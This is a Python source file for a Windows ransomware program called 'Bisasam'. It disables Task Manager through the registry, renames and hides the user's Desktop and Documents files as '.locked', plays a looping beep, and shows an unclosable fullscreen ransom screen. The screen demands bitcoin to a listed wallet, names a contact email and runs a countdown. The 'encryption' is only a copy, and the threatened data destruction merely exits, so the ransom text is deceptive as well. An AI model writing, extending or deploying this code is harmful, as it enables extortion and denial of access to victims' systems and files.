import os
import sys
import hashlib
import time
import ctypes
from datetime import datetime, timedelta
import threading
import shutil
import tkinter as tk
from tkinter import ttk, messagebox
import pygame
import numpy as np

# Logging setup
import logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def log(message):
    print(message)
    logging.info(message)

class Ransomware:
    def __init__(self):
        self.password = "n:___jdjdioadobisasamontop!!nsjhfjshhhkknmcx,,jskoslemfhnbjljs"  # Your specified password
        self.deadline = datetime.now() + timedelta(hours=24)  # Fixed 24-hour timer
        self.btc_wallet = "bc1qcsjfhvrpfsa2s8u6cslu0dfrtw0qz6760cv5rj"  # Your BTC address
        self.files_encrypted = []
        pygame.mixer.init(frequency=44100, size=-16, channels=2)
        self.start_audio()
        self.lock_system()
        self.encrypt_and_hide_files()
        try:
            log("Attempting to initialize GUI...")
            self.create_window()
            log("GUI initialized successfully.")
        except tk.TclError as e:
            log(f"GUI failed to initialize: {e}. Running in console mode.")
            self.run_console()
        except Exception as e:
            log(f"Unexpected error during GUI setup: {e}. Running in console mode.")
            self.run_console()
        self.monitor_shutdown()

    def start_audio(self):
        try:
            # Generate a simple beeping sound (440 Hz sine wave, 1 second, looped)
            sample_rate = 44100
            duration = 1.0  # 1 second beep
            frequency = 440  # A4 note
            t = np.linspace(0, duration, int(sample_rate * duration), False)
            audio_data = np.sin(2 * np.pi * frequency * t)
            audio_data = np.int16(audio_data * 32767)  # Convert to 16-bit
            audio_data = np.repeat(audio_data, 2)  # Stereo by repeating
            sound = pygame.sndarray.make_sound(audio_data)
            sound.play(-1)  # -1 loops indefinitely
            log("Embedded audio started in loop.")
        except Exception as e:
            log(f"Audio generation failed: {e}")

    def lock_system(self):
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", "reg", 
                'add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f', None, 1)
            log("Task Manager locked. Pay to unlock.")
        except Exception as e:
            log(f"Locking failed: {e}")

    def unlock_system(self):
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", "reg", 
                'delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f', None, 1)
            log("Task Manager unlocked.")
        except Exception as e:
            log(f"Unlocking failed: {e}")

    def encrypt_and_hide_files(self):
        # Limit to Desktop and Documents for faster scanning
        target_dirs = [os.path.join(os.path.expanduser("~"), "Desktop"), os.path.join(os.path.expanduser("~"), "Documents")]
        for target_dir in target_dirs:
            if os.path.exists(target_dir):
                for file in os.listdir(target_dir):
                    if file.endswith(('.txt', '.doc', '.jpg', '.png')) and not file.endswith('.locked'):
                        file_path = os.path.join(target_dir, file)
                        self.files_encrypted.append(file_path)
                        try:
                            with open(file_path, "rb") as f:
                                data = f.read()
                            encrypted_path = file_path + ".locked"
                            with open(encrypted_path, "wb") as f:
                                f.write(data)  # Simulate encryption with .locked extension
                            os.remove(file_path)
                            # Hide the encrypted file
                            import win32api, win32con
                            win32api.SetFileAttributes(encrypted_path, win32con.FILE_ATTRIBUTE_HIDDEN)
                            log(f"Encrypted and hidden: {file}")
                        except Exception as e:
                            log(f"Encryption/hiding error for {file}: {e}")

    def unhide_and_decrypt_files(self):
        for file in self.files_encrypted:
            locked_file = file + ".locked"
            if os.path.exists(locked_file):
                try:
                    # Unhide the file
                    import win32api, win32con
                    win32api.SetFileAttributes(locked_file, win32con.FILE_ATTRIBUTE_NORMAL)
                    with open(locked_file, "rb") as f:
                        data = f.read()
                    with open(file, "wb") as f:
                        f.write(data)
                    os.remove(locked_file)
                    log(f"Unhidden and decrypted: {file}")
                except Exception as e:
                    log(f"Decryption/unhiding error for {file}: {e}")

    def create_window(self):
        self.root = tk.Tk()
        self.root.title("Bisasam Ransomware")
        self.root.configure(bg="red")
        self.root.attributes("-fullscreen", True)  # Fullscreen mode
        self.root.attributes("-topmost", True)  # Keep window on top
        self.root.protocol("WM_DELETE_WINDOW", self.prevent_close)  # Prevent closing
        self.root.overrideredirect(True)  # Remove title bar and buttons

        # Bind keys to prevent closing
        self.root.bind("<Escape>", self.prevent_close)
        self.root.bind("<Alt-F4>", self.prevent_close)
        self.root.bind("<Control_L>", self.prevent_close)  # Block Ctrl
        self.root.bind("<Control_R>", self.prevent_close)  # Block Ctrl
        self.root.bind("<Alt_L>", self.prevent_close)  # Block Alt
        self.root.bind("<Alt_R>", self.prevent_close)  # Block Alt

        # "Bisasam" at the top
        tk.Label(self.root, text="Bisasam", fg="white", bg="red", font=("Arial", 16, "bold")).pack(pady=20)

        # Ransom message with email and proof requirement
        message = "ups! you just run bisasam ransomeware\npay 0,00051 BTC or all data will be lost\nand dont turn your pc off or the same thing will happen\nSend proof of payment to guwuwjsjs@gmail.com, then I will provide the password"
        tk.Label(self.root, text=message, fg="white", bg="red", font=("Arial", 12, "bold")).pack(pady=20)

        # BTC Address
        tk.Label(self.root, text=f"BTC Address: {self.btc_wallet}", fg="white", bg="red", font=("Arial", 10)).pack(pady=10)

        # Password Entry
        tk.Label(self.root, text="Enter Password to Unlock:", fg="white", bg="red", font=("Arial", 10)).pack(pady=10)
        self.pass_entry = tk.Entry(self.root, width=40)
        self.pass_entry.pack(pady=10)
        self.pass_entry.bind("<Return>", self.check_password)  # Check password on Enter

        # Timer Label
        self.timer_label = tk.Label(self.root, text="", fg="white", bg="red", font=("Arial", 10))
        self.timer_label.pack(pady=10)

        # Start window update with faster interval
        self.update_window()
        self.root.mainloop()

    def prevent_close(self, event=None):
        # Do nothing to prevent closing the window via any key or X
        pass

    def update_window(self):
        time_left = self.deadline - datetime.now()
        self.timer_label.config(text=f"Time Remaining: {time_left}")
        if time_left.total_seconds() <= 0:
            self.destroy_system()
        elif self.pass_entry.get() == self.password:
            pygame.mixer.stop()  # Stop audio on unlock
            self.unhide_and_decrypt_files()
            self.unlock_system()
            self.root.destroy()
            sys.exit(0)
        self.root.after(100, self.update_window)  # Update every 100ms for faster response

    def check_password(self, event):
        if self.pass_entry.get() == self.password:
            pygame.mixer.stop()  # Stop audio on unlock
            self.unhide_and_decrypt_files()
            self.unlock_system()
            self.root.destroy()
            sys.exit(0)

    def run_console(self):
        while True:
            time_left = self.deadline - datetime.now()
            if time_left.total_seconds() <= 0:
                self.destroy_system()
            print("ups! you just run bisasam ransomeware pay 0,00051 BTC or all data will be lost and dont turn your pc off or the same thing will happen")
            print(f"Time Remaining: {time_left}, BTC: {self.btc_wallet}, Password: {self.password}")
            time.sleep(1)

    def monitor_shutdown(self):
        def shutdown_trigger():
            while True:
                try:
                    if ctypes.windll.user32.GetAsyncKeyState(0x5B) or ctypes.windll.user32.GetAsyncKeyState(0x1B):  # Win or Esc key
                        self.destroy_system()
                    time.sleep(0.01)  # Faster sleep for responsiveness
                except Exception as e:
                    log(f"Shutdown monitor error: {e}")
                    time.sleep(0.01)
        threading.Thread(target=shutdown_trigger, daemon=True).start()

    def destroy_system(self):
        log("CRITICAL FAILURE: Data lost due to shutdown or non-payment!")
        if hasattr(self, 'root') and self.root.winfo_exists():
            self.root.destroy()
        sys.exit(1)

if __name__ == "__main__":
    try:
        ransomware = Ransomware()
    except Exception as e:
        log(f"Ransomware initialization failed: {e}")